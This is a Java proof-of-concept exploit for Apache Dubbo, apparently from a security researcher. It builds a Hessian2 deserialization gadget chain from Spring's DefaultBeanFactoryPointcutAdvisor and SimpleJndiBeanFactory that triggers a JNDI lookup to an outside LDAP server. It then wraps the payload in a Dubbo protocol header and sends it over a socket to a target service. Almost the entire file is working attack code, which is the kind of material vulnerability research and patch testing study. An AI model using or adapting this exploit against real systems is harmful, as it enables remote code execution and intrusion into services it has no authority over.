import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;

import org.apache.commons.logging.impl.NoOpLog;
import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
import org.springframework.beans.factory.BeanFactory;
import org.springframework.jndi.support.SimpleJndiBeanFactory;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.Socket;
import java.util.HashMap;
import java.util.Random;

public class DubboSpringAbstractBeanFactoryPointcutAdvisorPoc {

    public static void main(String[] args) throws Exception {

        String host = "127.0.0.1"; //args[0];
        int port =  12345;//Integer.parseInt(args[1]);
        String jndi =  "ldap://192.168.150.1:1389/9lo4do";//args[2];

        BeanFactory bf = makeJNDITrigger();

        Object o = makeBeanFactoryTriggerBFPA(jndi, bf);
//        Object o = makeBeanFactoryTriggerBFPA("ldap://127.0.0.1:8089/whatever", bf);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2Output out = new Hessian2Output(hessian2ByteArrayOutputStream);

        // 下面三句必须有，否则抛出异常。这里就是为了设置其不必实现Serializable
        // java.lang.IllegalStateException: Serialized class org.springframework.jndi.support.SimpleJndiBeanFactory must implement java.io.Serializable

        SerializerFactory sf = new SerializerFactory();
        sf.setAllowNonSerializable(true);
        out.setSerializerFactory(sf);

        // 写入恶意对象
        out.writeObject(o);
        out.flushBuffer();

        // header.
        byte[] header = new byte[16];
        short2bytes((short) 0xdabb, header);
        header[2] = (byte) ((byte) 0x80 | 0x20 | 2);

        long2bytes(new Random().nextInt(100000000), header, 4);
        int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
        // 写入header
        byteArrayOutputStream.write(header);

        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

        // 存在漏洞的Dubbo服务
        Socket socket = new Socket(host, port);
//        Socket socket = new Socket("127.0.0.1", 12345);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }


    // 以下为依赖的工具方法
    public static Object makeBeanFactoryTriggerBFPA(String name, BeanFactory bf)
            throws Exception {
        DefaultBeanFactoryPointcutAdvisor pcadv = new DefaultBeanFactoryPointcutAdvisor();
//        pcadv.setBeanFactory(bf);
//        pcadv.setAdviceBeanName(name);
//        pcadv.setAdvice(new org.springframework.cache.interceptor.CacheInterceptor());

//        Object pcadv = new Object();

        DefaultBeanFactoryPointcutAdvisor pcadv2 = new DefaultBeanFactoryPointcutAdvisor();
        pcadv2.setBeanFactory(bf);
        pcadv2.setAdviceBeanName(name);
//        pcadv2.setAdvice(new org.springframework.cache.interceptor.CacheInterceptor());
        return makeMap(pcadv, pcadv2);
    }

    public static HashMap<Object, Object> makeMap (Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, null, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, null, null));
        setFieldValue(s, "table", tbl);
        return s;
    }


    public static BeanFactory makeJNDITrigger () throws Exception {
        SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
        setFieldValue(bf, "logger", new NoOpLog());
        setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());
        return bf;
    }

    // 以下为反射相关方法，为了方便都写到一个文件里了
    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Field getField ( final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }

    // 以下为类型转换，为了方便都写到一个文件里了
    public static void short2bytes(short v, byte[] b) {
        short2bytes(v, b, 0);
    }

    public static void short2bytes(short v, byte[] b, int off) {
        b[off + 1] = (byte)v;
        b[off + 0] = (byte)(v >>> 8);
    }

    public static void int2bytes(int v, byte[] b, int off) {
        b[off + 3] = (byte)v;
        b[off + 2] = (byte)(v >>> 8);
        b[off + 1] = (byte)(v >>> 16);
        b[off + 0] = (byte)(v >>> 24);
    }

    public static void long2bytes(long v, byte[] b, int off) {
        b[off + 7] = (byte)((int)v);
        b[off + 6] = (byte)((int)(v >>> 8));
        b[off + 5] = (byte)((int)(v >>> 16));
        b[off + 4] = (byte)((int)(v >>> 24));
        b[off + 3] = (byte)((int)(v >>> 32));
        b[off + 2] = (byte)((int)(v >>> 40));
        b[off + 1] = (byte)((int)(v >>> 48));
        b[off + 0] = (byte)((int)(v >>> 56));
    }
}
